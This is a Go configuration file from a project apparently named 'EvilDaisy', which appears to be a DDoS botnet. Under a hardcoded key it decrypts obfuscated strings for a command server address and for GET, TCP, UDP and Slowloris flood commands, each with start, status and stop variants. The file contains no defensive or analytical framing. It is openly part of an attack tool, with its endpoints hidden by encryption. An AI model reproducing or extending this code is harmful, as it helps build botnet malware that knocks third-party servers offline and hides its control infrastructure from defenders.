package Configs

import (
	"EvilDaisy/Security"
)

// IsDebug ...
const IsDebug = true

// SecurityKey ...
const SecurityKey = "baea1baf0bc433ec"

// Network ...
var Network = Security.Decrypt("NXcARZ8KNTAjYeZrpwEP1_xGL5PuCm7MEjMR2vO0cfELBmcybTnK-YF2OK17LLRiX4fAIZYIm6DLc2pBYN7uzT0BvHgR0KRkC09qh189XNE=", []byte(SecurityKey))

// Address ...
var Address = Security.Decrypt("chLjhWRDyfTPGPEqtz4BJpUFnLvyV0YWbq8nCqOK7wKckwQdkbyZHTUYu5HxaaLsU4RWCTrO1F4Kuasfz4Zvh8a9FelcwZReVLac0iMSxFcTIAHUoTO0a7Gp22c=", []byte(SecurityKey))

// InvalidServer ...
var InvalidServer = Security.Decrypt("0lXNTSyQ9m78w-AHz5Qlt1iMoO1p0dahkZbEDALPcx7CRdnyvE84WBy2g4dJ-I5vq6GsVh22F23jm5hEeqYx3XDA1bKjaYyw-3Ax2RgV4SbOg-4GvQ-uQD_9gA==", []byte(SecurityKey))

// ########################################### GET ATTACK START ###########################################

// GET ...
var GET = Security.Decrypt("7wgOsTdojZ5RLWf8mD5E6nKIF5BfsvjJRhQOQIf0roZfUSG68DcMorfSFXCHGhlgCnXn8bwMVrIvL1AxP9WsvNWGS9vDnCVZmFr4qFX8wXI=", []byte(SecurityKey))

// GETStatus ...
var GETStatus = Security.Decrypt("hKiRChP-RwJir5Nexh0tgjiMS64KZp97zChR2SQiLdCiIOuqs8SaPe8WRN0vZICvp3R5poj2dXflvKgPyML7osy6MQqmxd3tBC3GwktnRrgTvVXA05Y=", []byte(SecurityKey))

// GETStop ...
var GETStop = Security.Decrypt("ZK-3O_brXphFC0mpHX5UNILDajL9emhlzfQPhJ_Eok1mTb1imeFDS_zuMSsPO1oBPIEIrzKiXn72uc50CETyxrxamp1acGO59cyOV00Tdl1ckaux", []byte(SecurityKey))

// ########################################### GET ATTACK END #############################################

// ########################################### TCP ATTACK START ###########################################

// TCP ...
var TCP = Security.Decrypt("8XRQ38riQNRJ97r2b_qdx2QCWNCPySD1wCPSKaW8qbC2LLPqW_0nziaixypffB6SXqhPi0-v05yX6u4pP9GiBJILH1lYWDlzdQOONGWN1XU=", []byte(SecurityKey))

// TCPStatus ...
var TCPStatus = Security.Decrypt("kPDdskKX2HkRsibluCwvgZaKB9mse1VovTrfGcx6Hr1bztTNEK5vWksAEYDKAn6OHX-1rindyW8hs7L4KKtxLi1JEqRcQVQkQMMCacwWMh0GaG5HzvM=", []byte(SecurityKey))

// TCPStop ...
var TCPStop = Security.Decrypt("HSvM0ex5wtmqQHyxxXgtfz5womvuz3LBMGKNUOPv5uL4i6awLZ4OL1mCwXXITJDMYrsCx_d6rCsc2NSzw_kubVVVtFZaCl8ZtLzmMnoeW4j4Srmf", []byte(SecurityKey))

// ########################################### TCP ATTACK END #############################################

// ########################################### UDP ATTACK START ###########################################

// UDP ...
var UDP = Security.Decrypt("wiIANMJwT2ZuPuKt6aqtJF8YQZUU2wllVkniIcMlJr2bAJQhk7I8zgWOvBFyDil6TIfuqIgdV-D0kptkcmK6XbRtDxnJpabK6UPDV4neI1M=", []byte(SecurityKey))

// UDPStatus ...
var UDPStatus = Security.Decrypt("hPMhxE_2zuSJrE-CQhl19ojkdSVlyGC30D_M8SN9VhLTbg7Mm8_z13EyLyVtKfufd2PB8RB1o0SrPYbkfYuJajntD2By4RK-xud7RRhgkgbrCPCMHjA=", []byte(SecurityKey))

// UDPStop ...
var UDPStop = Security.Decrypt("82NApYucWe8tjgMM3O1z0pzpT1HQU-BYLeDm5xcViFKSSqBzrDFAbhyj4MhJmqtpU-6UqVH_Jitc25-ArVg1uz96de-6OytUCm_qonnNMbdKDu89", []byte(SecurityKey))

// ########################################### UDP ATTACK END #############################################

// ########################################### SLOWLORIS  START ###########################################

// Slowloris ...
var Slowloris = Security.Decrypt("xG_Cjn9jB8jAAjdT-uFBA-ka7Ujw4GZPKS6gTL5TZ5NFGmzNK4fAv2-OkS4iAJSo6JQv2Epzh48BrikmsYyj1HVrY4WGe1XEBBv7Ne24PazOxLedfSY=", []byte(SecurityKey))

// SlowlorisStatus ...
var SlowlorisStatus = Security.Decrypt("0779HXYfp7o5TlEReMlvABacUf1de0A9tQRsUmoVrkyuF6N5trU9SIEVFCk1NiAPHxk-Ic3KFl1saOshKs5upU_vzrXwxUJ5OdjZ0z61-fJiVDaI89EYDi_eR-0=", []byte(SecurityKey))

// SlowlorisStop ...
var SlowlorisStop = Security.Decrypt("eZnACpvFU36RtQAXDcg6EVISbeNzniS-IGjdWMlPuKiHrqsFfEufHb1Eo91CMvK6Zv3cItBDJKSXFkoaByQpWSkCp-buOjgu9Dr0ZfVfN_KU9m9VTc4LN2bc", []byte(SecurityKey))

// ########################################### SLOWLORIS  END #############################################
